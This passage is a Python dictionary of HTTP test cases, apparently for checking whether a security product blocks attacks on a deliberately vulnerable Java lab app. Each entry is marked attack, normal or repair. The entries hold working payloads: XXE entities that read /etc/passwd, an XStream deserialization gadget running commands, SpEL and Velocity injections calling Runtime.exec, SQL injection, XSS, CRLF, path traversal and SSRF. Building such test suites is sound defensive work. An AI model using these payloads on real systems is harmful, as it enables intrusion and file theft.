        'data': """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'XXE-saxreader',
        'type': 'attack',
    },
    'xxe_documentbuilderfactory_attack': {
        'method': 'POST',
        'url': """http://{}:9991/xxe_documentbuilderfactory""".format(
            host),
        'data': """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'XXE-documentbuilderfactory',
        'type': 'attack',
    },

    'xxe_documentbuilderfactory_xinclude_attack': {
        'method': 'POST',
        'url': """http://{}:9991/xxe_documentbuilderfactory_xinclude""".format(
            host),
        'data': """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/><data>&xxe;</data></foo>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'XXE-documentbuilderfactory_xinclude',
        'type': 'attack',
    },

    'OpenRedirector_ModelAndView_attack': {
        'method': 'GET',
        'url': """http://{}:9991/OpenRedirector_ModelAndView?url=https://www.baidu.com""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'URL重定向漏洞-ModelAndView',
        'type': 'attack',
    },

    'OpenRedirector_sendRedirect_attack': {
        'method': 'GET',
        'url': """http://{}:9991/OpenRedirector_sendRedirect?url=https://www.baidu.com""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'URL重定向漏洞-sendRedirect',
        'type': 'attack',
    },

    'OpenRedirector_lacation_attack': {
        'method': 'GET',
        'url': """http://{}:9991/OpenRedirector_lacation?url=https://www.baidu.com""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'URL重定向漏洞-location',
        'type': 'attack',
    },
    'swagger-ui_attack': {
        'method': 'GET',
        'url': """http://{}:9991/swagger-ui.html""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'swagger-ui-未授权访问漏洞',
        'type': 'attack',
    },


'ReDos_normal_1': {
        'method': 'GET',
        'url': """http://{}:9991/testReDos1?input=1""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'ReDoS攻击-(a+)+',
        'type': 'normal',
    },

'ReDos_normal_2': {
        'method': 'GET',
        'url': """http://{}:9991/testReDos2?input=1""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'ReDoS攻击-([a-zA-Z]+)*',
        'type': 'normal',
    },

'ReDos_normal_3': {
        'method': 'GET',
        'url': """http://{}:9991/testReDos3?input=1""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'ReDoS攻击-(a|aa)+',
        'type': 'normal',
    },

'ReDos_normal_4': {
        'method': 'GET',
        'url': """http://{}:9991/testReDos4?input=1""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'ReDoS攻击-(a|a?)+',
        'type': 'normal',
    },
'ReDos_normal_5': {
        'method': 'GET',
        'url': """http://{}:9991/testReDos5?input=1""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'ReDoS攻击-(.*a){20}',
        'type': 'normal',
    },

'unsafeReflection_attack': {
        'method': 'GET',
        'url': """http://{}:9991/unsafeReflection?className=com.example.malicious.MaliciousClass""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': '不安全反射漏洞-攻击',
        'type': 'attack',
    },

'unsafeReflection_normal_1': {
        'method': 'GET',
        'url': """http://{}:9991/unsafeReflection?className=java.lang.Runtime""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': '不安全反射漏洞-无法利用',
        'type': 'normal',
    },

'unsafeReflection_normal_2': {
        'method': 'GET',
        'url': """http://{}:9991/unsafeReflection?className=java.util.Date""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': '不安全反射漏洞-显示日期',
        'type': 'normal',
    },


    'xxe_wxpay_attack': {
        'method': 'POST',
        'url': """http://{}:9974/wxpay-xxe""".format(
            host),
        'data': """<?xml version="1.0" encoding="utf-8"?><!DOCTYPE xdsec [<!ELEMENT methodname ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><methodcall><methodname>&xxe;</methodname></methodcall>""",
        'headers': {'Content-Type': 'application/json'},
        'name': '微信支付XXE漏洞',
        'type': 'attack',
    },

    'xstream_CVE-2019-10173': {
        'method': 'POST',
        'url': """http://{}:9973/CVE-2019-10173""".format(
            host),
        'data': """<sorted-set><dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>cp</string><string>/etc/passwd</string><string>/tmp</string></command></target><action>start</action></handler></dynamic-proxy></sorted-set>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'xstream 反序列化漏洞(CVE-2019-10173)',
        'type': 'attack',
    },

    'jackson-databind_CVE-2019-12384': {
        'method': 'GET',
        'url': """http://{}:9971/CVE-2019-12384""".format(
            host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'jackson-databind 反序列化漏洞(CVE-2019-12384)',
        'type': 'attack',
    },













    'sql_injection_id_repair': {
        'method': 'GET',
        'url': "http://{}:9990/users/1'/".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-数字',
        'type': 'repair',
    },
    'sql_injection_ids_repair': {
        'method': 'GET',
        'url': "http://{}:9990/users/ids/?ids=1,2,3'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-数组',
        'type': 'repair',
    },
    'sql_injection_like_repair': {
        'method': 'GET',
        'url': "http://{}:9990/users/name?name=A'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-like模糊匹配',
        'type': 'repair',
    },
    'sql_injection_strs_repair': {
        'method': 'GET',
        'url': "http://{}:9990/users/names?names=Alice&names=Bob'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-字符串数组',
        'type': 'repair',
    },
    'sql_injection_orderby_repair': {
        'method': 'GET',
        'url': "http://{}:9990/users/sort?orderByColumn=name&orderByDirection=asc'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-mybatics-排序',
        'type': 'repair',
    },

    'xss_reflect_htmlEscape_repair': {
        'method': 'GET',
        'url': 'http://{}:9990/xss_reflect_htmlEscape?name=<script>alert(123)</script>'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '反射型XSS漏洞-htmlEscape类',
        'type': 'repair',
    },

    'xss_reflect_escapeHtml4_repair': {
        'method': 'GET',
        'url': 'http://{}:9990/xss_reflect_escapeHtml4?name=<script>alert(123)</script>'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '反射型XSS漏洞-escapeHtml4类',
        'type': 'repair',
    },
    'xss_reflect_escapeHtml_reparir': {
        'method': 'GET',
        'url': 'http://{}:9990/xss_reflect_escapeHtml?name=<script>alert(123)</script>'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '反射型XSS漏洞-html编码',
        'type': 'repair',
    },
    'xss_storage_thymeleaf_reparir': {
        'method': 'GET',
        'url': 'http://{}:9990/xss_storage_thymeleaf?name=<script>alert(123)</script>'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '存储型XSS漏洞-thymeleaf模板过滤',
        'type': 'repair',
    },

    'file_upload_repair': {
        'method': 'POST',
        'url': 'http://{}:9990/file_upload'.format(host),
        'headers': {},
        'parm': 'file',
        'file': 'test.txt',
        'name': '任意文件上传漏洞',
        'type': 'repair',
    },

    'file_read_repair': {
        'method': 'GET',
        'url': 'http://{}:9990/file_read?filePath=pom.xml'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '文件读取漏洞',
        'type': 'repair',
    },

    'file_write_repair': {
        'method': 'GET',
        'url': 'http://{}:9990/file_write?fileName=test.txt&data=test'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '任意文件写入漏洞',
        'type': 'repair',
    },
    'file_write_normal': {
        'method': 'GET',
        'url': 'http://{}:9990/file_write?fileName=test.log&data=test'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '任意文件写入漏洞',
        'type': 'normal',
    },
    'file_download_repair': {
        'method': 'GET',
        'url': 'http://{}:9990/file_download?fileName=../test.log'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '任意文件下载漏洞',
        'type': 'repair',
    },
    'file_download_normal': {
        'method': 'GET',
        'url': 'http://{}:9990/file_download?fileName=test.log'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '任意文件下载漏洞',
        'type': 'normal',
    },

    'file_delete_repair': {
        'method': 'GET',
        'url': 'http://{}:9990/file_delete?fileName=test.txt'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '任意文件删除漏洞',
        'type': 'repair',
    },
    'runtime_command_execute_normal': {
        'method': 'GET',
        'url': 'http://{}:9990/runtime_command_execute?command=ls'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '命令执行漏洞-Runtime',
        'type': 'normal',
    },
    'runtime_command_execute_repair': {
        'method': 'GET',
        'url': 'http://{}:9990/runtime_command_execute?command=whoami'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '命令执行漏洞-Runtime',
        'type': 'repair',
    },

    'process_builder_command_normal': {
        'method': 'GET',
        'url': 'http://{}:9990/process_builder_command_execute?command=ls'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '命令执行漏洞-ProcessBuilder',
        'type': 'normal',
    },

    'process_builder_command_repair': {
        'method': 'GET',
        'url': 'http://{}:9990/process_builder_command_execute?command=whoami'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': '命令执行漏洞-ProcessBuilder',
        'type': 'repair',
    },

    'crlf_injection_repair': {
        'method': 'GET',
        'url': 'http://{}:9990/crlf_injection?name=%0D%0ASet-Cookie: sessionid=123456'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'CRLF注入',
        'type': 'repair',
    },

    'spel_expression_repair': {
        'method': 'GET',
        'url': "http://{}:9990/spel_expression?input=T(java.lang.Runtime).getRuntime().exec('whoami')".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SPEL表达式攻击',
        'type': 'repair',
    },

    'spel_expression_normal': {
        'method': 'GET',
        'url': "http://{}:9990/spel_expression?input=1".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SPEL表达式攻击',
        'type': 'normal',
    },

    'ssrf_openStream_repair': {
        'method': 'GET',
        'url': "http://{}:9990/ssrf_openStream?url=https://www.baidu.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-openStream',
        'type': 'repair',
    },

    'ssrf_openConnection_repair': {
        'method': 'GET',
        'url': "http://{}:9990/ssrf_openConnection?url=http://www.baidu.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-openConnection',
        'type': 'repair',
    },

    'ssrf_requestGet_repair': {
        'method': 'GET',
        'url': "http://{}:9990/ssrf_requestGet?url=http://www.baidu.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-requestGet',
        'type': 'repair',
    },

    'ssrf_okhttp_repair': {
        'method': 'GET',
        'url': "http://{}:9990/ssrf_okhttp?url=http://www.baidu.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-okhttp',
        'type': 'repair',
    },

    'ssrf_defaultHttpClient_repair': {
        'method': 'GET',
        'url': "http://{}:9990/ssrf_defaultHttpClient?url=http://www.baidu.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-defaultHttpClient',
        'type': 'repair',
    },

    'ssrf_openStream_normal': {
        'method': 'GET',
        'url': "http://{}:9990/ssrf_openStream?url=http://example.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-openStream',
        'type': 'normal',
    },

    'ssrf_openConnection_normal': {
        'method': 'GET',
        'url': "http://{}:9990/ssrf_openConnection?url=http://example.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-openConnection',
        'type': 'normal',
    },

    'ssrf_requestGet_normal': {
        'method': 'GET',
        'url': "http://{}:9990/ssrf_requestGet?url=http://example.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-requestGet',
        'type': 'normal',
    },

    'ssrf_okhttp_normal': {
        'method': 'GET',
        'url': "http://{}:9990/ssrf_okhttp?url=http://example.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-okhttp',
        'type': 'normal',
    },

    'ssrf_defaultHttpClient_normal': {
        'method': 'GET',
        'url': "http://{}:9990/ssrf_defaultHttpClient?url=http://example.com".format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSRF攻击-defaultHttpClient',
        'type': 'normal',
    },


    'ssti_velocity_repair': {
        'method': 'GET',
        'url': """http://{}:9990/ssti_velocity?content=%23set (%24exp %3d "exp")%3b%24exp.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'SSTI攻击-velocity',
        'type': 'repair',
    },

    'xxe_saxparserfactory_repair': {
        'method': 'POST',
        'url': """http://{}:9990/xxe_saxparserfactory""".format(
            host),
        'data': """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'XXE-saxparserfactory',
        'type': 'repair',
    },

    'xxe_xmlreaderfactory_repair': {
        'method': 'POST',
        'url': """http://{}:9990/xxe_xmlreaderfactory""".format(
            host),
        'data': """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'XXE-xmlreaderfactory',
        'type': 'repair',
    },
    'xxe_saxbuilder_repair': {
        'method': 'POST',
        'url': """http://{}:9990/xxe_saxbuilder""".format(
            host),
        'data': """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'XXE-saxbuilder',
        'type': 'repair',
    },
    'xxe_saxreader_repair': {
        'method': 'POST',
        'url': """http://{}:9990/xxe_saxreader""".format(
            host),
        'data': """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'XXE-saxreader',
        'type': 'repair',
    },

    'xxe_documentbuilderfactory_repair': {
        'method': 'POST',
        'url': """http://{}:9990/xxe_documentbuilderfactory""".format(
            host),
        'data': """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'XXE-documentbuilderfactory',
        'type': 'repair',
    },
    'xxe_documentbuilderfactory_xinclude_repair': {
        'method': 'POST',
        'url': """http://{}:9990/xxe_documentbuilderfactory_xinclude""".format(
            host),
        'data': """<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/><data>&xxe;</data></foo>""",
        'headers': {'Content-Type': 'application/json'},
        'name': 'XXE-documentbuilderfactory_xinclude',
        'type': 'repair',
    },


    'OpenRedirector_ModelAndView_normal': {
        'method': 'GET',
        'url': """http://{}:9990/OpenRedirector_ModelAndView?url=https://example.com""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'URL重定向漏洞-ModelAndView',
        'type': 'normal',
    },

    'OpenRedirector_sendRedirect_normal': {
        'method': 'GET',
        'url': """http://{}:9990/OpenRedirector_sendRedirect?url=https://example.com""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'URL重定向漏洞-sendRedirect',
        'type': 'normal',
    },

    'OpenRedirector_lacation_normal': {
        'method': 'GET',
        'url': """http://{}:9990/OpenRedirector_lacation?url=https://example.com""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'URL重定向漏洞-location',
        'type': 'normal',
    },
    'OpenRedirector_ModelAndView_repair': {
        'method': 'GET',
        'url': """http://{}:9990/OpenRedirector_ModelAndView?url=https://www.baidu.com""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'URL重定向漏洞-ModelAndView',
        'type': 'repair',
    },

    'OpenRedirector_sendRedirect_repair': {
        'method': 'GET',
        'url': """http://{}:9990/OpenRedirector_sendRedirect?url=https://www.baidu.com""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'URL重定向漏洞-sendRedirect',
        'type': 'repair',
    },

    'OpenRedirector_lacation_repair': {
        'method': 'GET',
        'url': """http://{}:9990/OpenRedirector_lacation?url=https://www.baidu.com""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'URL重定向漏洞-location',
        'type': 'repair',
    },

    'swagger-ui_repair': {
        'method': 'GET',
        'url': """http://{}:9990/swagger-ui.html""".format(
            host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'name': 'swagger-ui-未授权访问漏洞',
        'type': 'repair',
    },

    'sql_injection_Optional_repair': {
        'method': 'GET',
        'url': "http://{}:9990/users/findByOptionalUsername?username=test'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-Optional<String>',
        'type': 'repair',
    },

    'sql_injection_Object_repair': {
        'method': 'POST',
        'url': "http://{}:9990/users/get_name_object".format(host),
        'headers': {'Content-Type': 'application/json'},
        'data':'{"name":"test\'"}',
        'name': 'SQL注入-Object[]',
        'type': 'repair',
    },

    'sql_injection_Annotation_repair': {
        'method': 'GET',
        'url': "http://{}:9990/users/by-username?name=test".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-MyBatis注解方式',
        'type': 'repair',
    },

    'sql_injection_lombok_repair': {
        'method': 'POST',
        'url': "http://{}:9990/users/lombok".format(host),
        'headers': {'Content-Type': 'application/json'},
        'data':'{"name":"test\'"}',
        'name': 'SQL注入-lombok',
        'type': 'repair',
    },

    'sql_injection_hsqldb_repair': {
        'method': 'GET',
        'url': "http://{}:9989/hsqldb_repair?username=1'".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-hsqldb',
        'type': 'repair',
    },

    'sql_injection_Hibernate_repair': {
        'method': 'GET',
        'url': "http://{}:9988/Hibernate_injection_repair?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'='".format(host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'SQL注入-Hibernate',
        'type': 'repair',
    },

    'cas_xxe_normal': {
        'method': 'POST',
        'url': "http://{}:9971/xxe_cas".format(
            host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'cas xxe',
        'data': '<!--?xml version="1.0" ?--><userInfo> <firstName>John</firstName><lastName>&ent;</lastName></userInfo>',
        'type': 'normal',
    },

    'cas_xxe_attack': {
        'method': 'POST',
        'url': "http://{}:9971/xxe_cas".format(
            host),
        'headers': {'Content-Type': 'application/json'},
        'name': 'cas xxe',
        'data': '<!--?xml version="1.0" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]><userInfo> <firstName>John</firstName><lastName>&ent;</lastName></userInfo>',
        'type': 'attack',
    },


}
